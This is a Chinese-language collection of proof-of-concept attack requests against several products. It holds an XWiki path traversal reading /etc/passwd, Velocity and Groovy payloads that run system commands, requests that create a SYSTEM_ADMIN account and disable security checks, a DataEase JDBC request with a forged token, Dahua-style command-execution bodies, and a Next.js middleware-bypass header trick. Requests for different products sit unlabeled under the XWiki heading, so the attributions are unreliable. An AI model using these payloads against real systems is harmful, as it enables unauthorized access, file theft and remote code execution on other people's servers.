XWiki 路径遍历漏洞（CVE-2026-23734，CVSS 9.9）。攻击者可通过向 XWiki 的文件管理/附件服务发送特制请求，利用路径遍历读取任意文件或通过模板注入执行 Groovy/Velocity 脚本，实现远程代码执行。

PoC:
 GET /xwiki/bin/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
 Host: target
 {{velocity}}$xwiki.getClass('java.lang.Runtime').getRuntime().exec('id'){{/velocity}}
 {{groovy}}Runtime.getRuntime().exec("id"){{/groovy}}

POST /api/rest/admin/users HTTP/1.1 Host: target Content-Type: application/json

{"username":"attacker","password":"P@ss1234","permissions":["SYSTEM_ADMIN"]}

POST /api/rest/admin/settings HTTP/1.1 Host: target Content-Type: application/json

{"allowExternalAuth":false,"disableSecurityChecks":true}

POST /de2api/datasource/validate HTTP/1.1 Host: target X-DE-TOKEN: <伪造JWT> Content-Type: application/json

{"type":"h2","configuration":"<base64 JDBC URL>"}

https://github.com/vulhub/vulhub/tree/master/dataease/CVE-2025-49001

POST /evo-runs/v1.0/receive HTTP/1.1 Host: target X-Subject-Headerflag: ADAPT Content-Type: application/json

{"method":"agent.ossm.mapping.config","info":{"configure":"x","filePath":"x","paramMap":{"shellPath":"/bin/bash -c 'id>/tmp/result.txt'","filePath":"x"},"requestIp":""}}

POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1 Host: target Content-Type: application/json

{"data":{"clazzName":"com.dahua.admin.util.RuntimeUtil","methodName":"syncexecReturnInputStream","fieldName":["id"]}}

Next.js 存在中间件跳过漏洞（CVE-2025-29927，CVSS 9.1）。攻击者可通过在 HTTP 请求头中设置 x-middleware-subrequest 头，强制 Next.js 跳过中间件（Middleware）的执行流程，直接绕过认证检查、日志记录、安全头设置等控制，访问受保护的路由。影响 Next.js 12.x~15.x 多个版本。

PoC:
 curl -k -H 'x-middleware-subrequest: 1' ''
 curl -k -H 'x-middleware-subrequest: middleware:middleware:middleware' ''
 fetch('/admin', {
 headers: { 'x-middleware-subrequest': 'middleware' }
 })

 原理：Next.js 内部使用 x-middleware-subrequest 头防止中间件递归调用，但未验证该头来源，攻击者可伪造该头跳过整个中间件链。
